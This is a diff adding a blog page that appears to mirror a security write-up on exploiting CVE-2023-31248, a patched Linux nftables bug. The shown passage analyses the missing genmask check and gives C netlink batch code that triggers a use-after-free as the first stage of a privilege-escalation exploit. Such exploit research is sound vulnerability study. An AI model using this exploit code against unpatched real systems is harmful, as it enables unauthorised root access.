@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <title>Kernels and Cats</title>
+    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
+    <meta content="utf-8" http-equiv="encoding">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="theme-color" content="#000084" />
+    <meta name="google-site-verification" content="733C7I2uDZnatcput9zZupeQ_PX5Z0BJ1HmTnGi0SJI" />
+	<link rel="icon" href="https://kaligulaarmblessed.github.io/favicon.ico">
+    <link rel="canonical" href="https://kaligulaarmblessed.github.io">
+    
+    
+</head>
+<body>
+<nav class="navbar navbar-inverse navbar-fixed-top">
+    <div class="navbar-inner">
+        <div class="container">
+            <button type="button" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"></button>
+            <a class="brand" href="https://kaligulaarmblessed.github.io">Kernels and Cats</a>
+            <div class="nav-collapse collapse">
+                <ul class="nav">
+                    
+                    
+                        
+                            <li>
+                                <a href="/about/">
+                                    
+                                    <span>About</span>
+                                </a>
+                            </li>
+                        
+                    
+                        
+                            <li>
+                                <a href="/post/">
+                                    
+                                    <span>All posts</span>
+                                </a>
+                            </li>
+                        
+                    
+                </ul>
+            </div>
+        </div>
+    </div>
+</nav><div id="content" class="container">
+
+<div class="row-fluid navmargin">
+    <div class="page-header">
+        <h1>nftables Adventures: CVE-2023-31248 -- Oh How The Turn Tables! [Part 2] - Thu, Sep 28, 2023</h1>
+    </div>
+    <p class="lead"></p>
+    <h4 id="tldr">TLDR</h4>
+<p>CVE-2023-31248 is an n-day bug affecting nftables reported by Mingi Cho. The bug report and patch can be found here: <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=515ad530795c118f012539ed76d02bacfd426d89">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=515ad530795c118f012539ed76d02bacfd426d89</a>. Linux kernel versions before 6.2.0-26 generic are vulnerable to this bug. My exploit has been tested on Ubuntu 23.04 (Lunar Lobster), with kernel version 6.2.0-20 generic.</p>
+<p>The official version of this writeup can be found at this link: <a href="https://starlabs.sg/blog/2023/09-nftables-adventures-bug-hunting-and-n-day-exploitation/">https://starlabs.sg/blog/2023/09-nftables-adventures-bug-hunting-and-n-day-exploitation/</a></p>
+<h4 id="nftable-of-contents">nfTable of Contents</h4>
+<ol>
+<li><a href="#vulnerability-analysis">Vulnerability Analysis</a></li>
+<li><a href="#triggering-the-bug-with-a-single-batch-transaction">Triggering the Bug</a></li>
+<li><a href="#obtaining-a-use-after-free">Obtaining a Use-After-Free</a></li>
+<li><a href="#obtaining-a-kernel-text-leak">Obtaining a Kernel Text Leak</a></li>
+<li><a href="#obtaining-a-heap-leak">Obtaining a Heap Leak</a></li>
+<li><a href="#controlling-rip">Controlling RIP</a></li>
+<li><a href="#patch-analysis">Patch Analysis</a></li>
+<li><a href="#exploit-demo">Exploit Demo</a></li>
+<li><a href="#acknowledgements">Acknowledgements</a></li>
+<li><a href="#references-and-credits">References and Credits</a></li>
+</ol>
+<h4 id="vulnerability-analysis">Vulnerability Analysis</h4>
+<p><code>nft_chain_lookup_byid</code> does not check whether a chain is active (by checking the genmask) when looking up a chain, as seen in the code below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> nft_chain <span style="color:#f92672">*</span><span style="color:#a6e22e">nft_chain_lookup_byid</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> net <span style="color:#f92672">*</span>net,
+</span></span><span style="display:flex;"><span>					       <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nft_table <span style="color:#f92672">*</span>table,
+</span></span><span style="display:flex;"><span>					       <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nlattr <span style="color:#f92672">*</span>nla)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nftables_pernet <span style="color:#f92672">*</span>nft_net <span style="color:#f92672">=</span> <span style="color:#a6e22e">nft_pernet</span>(net);
+</span></span><span style="display:flex;"><span>	u32 id <span style="color:#f92672">=</span> <span style="color:#a6e22e">ntohl</span>(<span style="color:#a6e22e">nla_get_be32</span>(nla));
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nft_trans <span style="color:#f92672">*</span>trans;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">list_for_each_entry</span>(trans, <span style="color:#f92672">&amp;</span>nft_net<span style="color:#f92672">-&gt;</span>commit_list, list) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">struct</span> nft_chain <span style="color:#f92672">*</span>chain <span style="color:#f92672">=</span> trans<span style="color:#f92672">-&gt;</span>ctx.chain;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (trans<span style="color:#f92672">-&gt;</span>msg_type <span style="color:#f92672">==</span> NFT_MSG_NEWCHAIN <span style="color:#f92672">&amp;&amp;</span>
+</span></span><span style="display:flex;"><span>		    chain<span style="color:#f92672">-&gt;</span>table <span style="color:#f92672">==</span> table <span style="color:#f92672">&amp;&amp;</span>
+</span></span><span style="display:flex;"><span>		    id <span style="color:#f92672">==</span> <span style="color:#a6e22e">nft_trans_chain_id</span>(trans))
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> chain;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ERR_PTR</span>(<span style="color:#f92672">-</span>ENOENT);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>When adding a rule to a chain referring to its ID, if that chain had been deleted on the same batch, it is possible to refer to an inactive chain. Rule addition will fail immediately afterwards due to the value of chain-&gt;use not being 0, resulting in a warning being displayed.</p>
+<h4 id="triggering-the-bug-with-a-single-batch-transaction">Triggering the bug with a single batch transaction</h4>
+<p>To trigger the bug, a batch transaction can be sent comprising of the following steps:</p>
+<ol>
+<li>Create a new table &ldquo;table1&rdquo; (<code>NFT_MSG_NEWTABLE</code>)</li>
+<li>Create a new chain &ldquo;chain1&rdquo; (<code>NFT_MSG_NEWCHAIN</code>)</li>
+<li>Delete &ldquo;chain1&rdquo; (<code>NFT_MSG_DELCHAIN</code>)</li>
+<li>Create a new chain &ldquo;chain2&rdquo; (<code>NFT_MSG_NEWCHAIN</code>)</li>
+<li>Create a rule inside chain2 referencing chain1. This can be done with a jump or goto expression with the destination chain set to chain1&rsquo;s chain ID. (<code>NFT_MSG_NEWRULE</code>)</li>
+</ol>
+<p>When the new rule is created, the following code path is taken such that the value of chain-&gt;use for the destination chain (chain1) is incremented from 0 to 1. This is due to the fact that a new reference to chain1 is created.</p>
+<pre tabindex="0"><code>nf_tables_newrule
+    -&gt; nf_tables_newexpr 
+        -&gt; nft_immediate_init 
+            -&gt; nft_data_init 
+                -&gt; nft_verdict_init 
+</code></pre><p>As all the actions in the batch transaction are determined to be valid, the batch transaction succeeds. When a valid batch transaction succeeds, <code>nfnetlink_rcv_batch</code> calls the commit operation for <code>nf_tables_subsys</code>, which is <code>nf_tables_commit</code>.</p>
+<p>Note that the <code>struct nft_chain chain1</code> object is not immediately deleted when <code>NFT_MSG_DELCHAIN</code> is received. For each action, a transaction is added to the list, and all the transactions are processed when commit is called. Destruction of deleted objects is then scheduled, and performed by a worker thread asynchronously. The following code path is then taken to destroy and free the chain1 object, which has been marked as inactive:</p>
+<pre tabindex="0"><code>nf_tables_commit
+    -&gt; nf_tables_commit_release
+        -&gt; nf_tables_trans_destroy_work 
+            -&gt; nft_commit_release
+                -&gt; nf_tables_chain_destroy
+</code></pre><p>However, in this case, when <code>nf_tables_chain_destroy</code> is reached, chain1 is not freed and a warning is displayed. This is because chain1&rsquo;s chain-&gt;use is 1 and not 0 ([6]).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">nf_tables_chain_destroy</span>(<span style="color:#66d9ef">struct</span> nft_ctx <span style="color:#f92672">*</span>ctx)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nft_chain <span style="color:#f92672">*</span>chain <span style="color:#f92672">=</span> ctx<span style="color:#f92672">-&gt;</span>chain;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nft_hook <span style="color:#f92672">*</span>hook, <span style="color:#f92672">*</span>next;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">WARN_ON</span>(chain<span style="color:#f92672">-&gt;</span>use <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>))                                     <span style="color:#f92672">&lt;--</span> [<span style="color:#ae81ff">6</span>]
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* no concurrent access possible anymore */</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nf_tables_chain_free_chain_rules</span>(chain);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">nft_is_base_chain</span>(chain)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">struct</span> nft_base_chain <span style="color:#f92672">*</span>basechain <span style="color:#f92672">=</span> <span style="color:#a6e22e">nft_base_chain</span>(chain);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">nft_base_chain_netdev</span>(ctx<span style="color:#f92672">-&gt;</span>family, basechain<span style="color:#f92672">-&gt;</span>ops.hooknum)) {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">list_for_each_entry_safe</span>(hook, next,
+</span></span><span style="display:flex;"><span>						 <span style="color:#f92672">&amp;</span>basechain<span style="color:#f92672">-&gt;</span>hook_list, list) {
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">list_del_rcu</span>(<span style="color:#f92672">&amp;</span>hook<span style="color:#f92672">-&gt;</span>list);
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">kfree_rcu</span>(hook, rcu);
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">module_put</span>(basechain<span style="color:#f92672">-&gt;</span>type<span style="color:#f92672">-&gt;</span>owner);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">rcu_access_pointer</span>(basechain<span style="color:#f92672">-&gt;</span>stats)) {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">static_branch_dec</span>(<span style="color:#f92672">&amp;</span>nft_counters_enabled);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">free_percpu</span>(<span style="color:#a6e22e">rcu_dereference_raw</span>(basechain<span style="color:#f92672">-&gt;</span>stats));
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">kfree</span>(chain<span style="color:#f92672">-&gt;</span>name);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">kfree</span>(chain<span style="color:#f92672">-&gt;</span>udata);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">kfree</span>(basechain);
+</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">kfree</span>(chain<span style="color:#f92672">-&gt;</span>name);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">kfree</span>(chain<span style="color:#f92672">-&gt;</span>udata);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">kfree</span>(chain);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="exploitation">Exploitation</h4>
+<h4 id="obtaining-a-use-after-free">Obtaining a Use-After-Free</h4>
+<p>The first step to writing a successful privilege escalation exploit is obtaining a use-after-free primitive. Essentially, we need to find a way to decrease chain-&gt;use of the deleted chain to 0 so that when <code>nf_tables_chain_destroy</code> is called, the chain object is freed. This can be done via exploiting the race condition between the control plane (<code>nf_tables_delrule</code>) and the transaction worker (<code>nf_tables_trans_destroy_work</code>).</p>
+<p>In order to do this, 2 batch transactions were sent. In the first batch transaction, the following actions were performed:</p>
+<ol>
+<li>Create a new table &ldquo;test_table&rdquo; (<code>NFT_MSG_NEWTABLE</code>)</li>
+<li>Create a new chain &ldquo;chain1&rdquo; with name &ldquo;AAAAAAAAAAAAAAAAAAAA&rdquo; (<code>NFT_MSG_NEWCHAIN</code>). The name of the chain is 20 characters long. This is the chain to be deleted.</li>
+<li>Delete chain 1 (<code>NFT_MSG_DELCHAIN</code>)</li>
+<li>Create a new chain &ldquo;chain2&rdquo; (<code>NFT_MSG_NEWCHAIN</code>)</li>
+<li>Create a rule inside &ldquo;chain2&rdquo; referencing chain 1 with name &ldquo;AAAAAAAAAAAAAAAAAAAA&rdquo;. In the exploit, this was done with an immediate &ldquo;goto&rdquo; expression with the destination chain set to the target chain using the chain ID.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Start nl message 1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	batch <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_nlmsg_batch_start</span>(buf, <span style="color:#66d9ef">sizeof</span>(buf));
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_batch_begin</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), seq<span style="color:#f92672">++</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Create table 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> nftnl_table <span style="color:#f92672">*</span>t <span style="color:#f92672">=</span> <span style="color:#a6e22e">build_table</span>(table_name, NFPROTO_IPV4);
+</span></span><span style="display:flex;"><span>    family <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_table_get_u32</span>(t, NFTNL_TABLE_FAMILY);
+</span></span><span style="display:flex;"><span>    nlh <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_nlmsg_build_hdr</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), NFT_MSG_NEWTABLE, family, NLM_F_CREATE <span style="color:#f92672">|</span> NLM_F_ACK, seq<span style="color:#f92672">++</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_table_nlmsg_build_payload</span>(nlh, t);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_table_free</span>(t);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Create chain 1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> nftnl_chain <span style="color:#f92672">*</span>c <span style="color:#f92672">=</span> <span style="color:#a6e22e">build_chain</span>(table_name, chain_name, NULL, <span style="color:#ae81ff">0x1234</span>);
+</span></span><span style="display:flex;"><span>    nlh <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_nlmsg_build_hdr</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), NFT_MSG_NEWCHAIN, family, NLM_F_CREATE <span style="color:#f92672">|</span> NLM_F_ACK, seq<span style="color:#f92672">++</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_chain_nlmsg_build_payload</span>(nlh, c);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Delete chain 1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    nlh <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_nlmsg_build_hdr</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), NFT_MSG_DELCHAIN, family, NLM_F_CREATE <span style="color:#f92672">|</span> NLM_F_ACK, seq<span style="color:#f92672">++</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_chain_nlmsg_build_payload</span>(nlh, c);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_chain_free</span>(c); 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Create chain 2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> nftnl_chain <span style="color:#f92672">*</span>c2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">build_chain</span>(table_name, <span style="color:#e6db74">&#34;chain2&#34;</span>, <span style="color:#f92672">&amp;</span>bp, <span style="color:#ae81ff">10</span>);
+</span></span><span style="display:flex;"><span>    nlh <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_nlmsg_build_hdr</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), NFT_MSG_NEWCHAIN, family, NLM_F_CREATE <span style="color:#f92672">|</span> NLM_F_ACK, seq<span style="color:#f92672">++</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_chain_nlmsg_build_payload</span>(nlh, c2);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_chain_free</span>(c2);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Create rule pointing to chain 1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span>r <span style="color:#f92672">=</span> <span style="color:#a6e22e">build_rule</span>(table_name, <span style="color:#e6db74">&#34;chain2&#34;</span>, family, NULL);
+</span></span><span style="display:flex;"><span>    nlh <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_nlmsg_build_hdr</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), NFT_MSG_NEWRULE, family, NLM_F_CREATE <span style="color:#f92672">|</span> NLM_F_ACK, seq<span style="color:#f92672">++</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Add immediate expr to rule
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> nftnl_expr <span style="color:#f92672">*</span>e <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_expr_alloc</span>(<span style="color:#e6db74">&#34;immediate&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_IMM_VERDICT, NFT_GOTO);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_IMM_CHAIN_ID, <span style="color:#ae81ff">0x1234</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_rule_add_expr</span>(r, e); 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_rule_nlmsg_build_payload</span>(nlh, r);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch); 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_batch_end</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), seq<span style="color:#f92672">++</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Send netlink message
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Sending netlink message 1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_sendto</span>(nl, <span style="color:#a6e22e">mnl_nlmsg_batch_head</span>(batch),
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">mnl_nlmsg_batch_size</span>(batch));
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_sendto&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mnl_nlmsg_batch_stop</span>(batch);
+</span></span></code></pre></div><p>As all the actions in the first batch transaction are valid, commit is called, and the transaction worker which destroys inactive objects is scheduled.</p>
+<p>The second batch transaction consists of the following operations:</p>
+<ol>
+<li>Delete the rule referencing the target chain (<code>NFT_MSG_DELRULE</code>)</li>
+<li>Create an invalid rule. In this case, audit_info-&gt;type can take values ranging from 0 to 2 inclusive, so 0xff is an invalid value which will cause the batch to fail. [7]</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Start nl message 2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    batch <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_nlmsg_batch_start</span>(buf, <span style="color:#66d9ef">sizeof</span>(buf));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_batch_begin</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), seq<span style="color:#f92672">++</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Delete rule 1 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    nlh <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_nlmsg_build_hdr</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), NFT_MSG_DELRULE, family, NLM_F_CREATE <span style="color:#f92672">|</span> NLM_F_ACK, seq<span style="color:#f92672">++</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_rule_nlmsg_build_payload</span>(nlh, r);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch); 
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Fail the batch using a invalid rule
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span>r2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_rule_alloc</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_rule_set_u32</span>(r2, NFTNL_RULE_FAMILY, NFPROTO_IPV4);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_rule_set_str</span>(r2, NFTNL_RULE_TABLE, table_name);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_rule_set_str</span>(r2, NFTNL_RULE_CHAIN, <span style="color:#e6db74">&#34;chain2&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> xt_audit_info <span style="color:#f92672">*</span>audit_info;
+</span></span><span style="display:flex;"><span>    audit_info <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> xt_audit_info));
+</span></span><span style="display:flex;"><span>    audit_info<span style="color:#f92672">-&gt;</span>type <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xff</span>;                                         <span style="color:#f92672">&lt;--</span> [<span style="color:#ae81ff">7</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> nftnl_expr <span style="color:#f92672">*</span>e2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_expr_alloc</span>(<span style="color:#e6db74">&#34;target&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_expr_set_str</span>(e2, NFTNL_EXPR_TG_NAME, <span style="color:#e6db74">&#34;AUDIT&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_expr_set_u32</span>(e2, NFTNL_EXPR_TG_REV, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_expr_set_data</span>(e2, NFTNL_EXPR_TG_INFO, audit_info, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> xt_audit_info));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_rule_add_expr</span>(r2, e2);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    nlh <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_nlmsg_build_hdr</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), NFT_MSG_NEWRULE, family, NLM_F_CREATE <span style="color:#f92672">|</span> NLM_F_ACK, seq<span style="color:#f92672">++</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_rule_nlmsg_build_payload</span>(nlh, r2);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_batch_end</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), seq<span style="color:#f92672">++</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Send netlink message 2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Sending netlink message 2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_sendto</span>(nl, <span style="color:#a6e22e">mnl_nlmsg_batch_head</span>(batch),
+</span></span><span style="display:flex;"><span>		        <span style="color:#a6e22e">mnl_nlmsg_batch_size</span>(batch));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_sendto&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mnl_nlmsg_batch_stop</span>(batch);
+</span></span></code></pre></div><p>As the second batch transaction fails, commit will not be called. However, nftables netlink messages were still passed to nftables, and operations in the control plane will still be performed (they will be aborted at the very end when the batch transaction fails).</p>
+<p>As <code>NFT_MSG_DELRULE</code> was passed to nftables, the following code path is taken:</p>
+<pre tabindex="0"><code>nf_tables_delrule
+    -&gt; nft_delrule_by_chain
+        -&gt; nft_delrule
+            -&gt; nft_rule_expr_deactivate
+                -&gt; nft_immediate_deactivate
+                    -&gt; nft_data_release
+                        -&gt; nft_verdict_uninit
+</code></pre><p>Specifically, in <code>nft_verdict_uninit</code>, chain-&gt;use of the referenced chain (which in this case would be our target chain &ldquo;AAAAAAAAAAAAAAAAAAAA&rdquo;) will be decremented from 1 to 0.</p>
